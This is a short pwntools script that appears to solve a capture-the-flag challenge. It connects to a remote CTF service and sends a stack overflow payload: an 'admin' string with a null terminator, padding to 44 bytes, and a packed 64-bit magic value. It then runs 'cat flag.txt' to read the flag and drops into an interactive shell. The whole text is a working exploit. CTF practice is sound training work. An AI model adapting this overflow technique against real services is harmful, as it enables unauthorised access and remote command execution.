from pwn import *

p = remote("pwn.dctf.si", 13371)

mal = b'admin\0'
mal += b'A' * (44 - len(mal))
mal += p64(0x1337c0de)
p.sendline(mal)

p.sendline(b"cat flag.txt")

p.interactive()
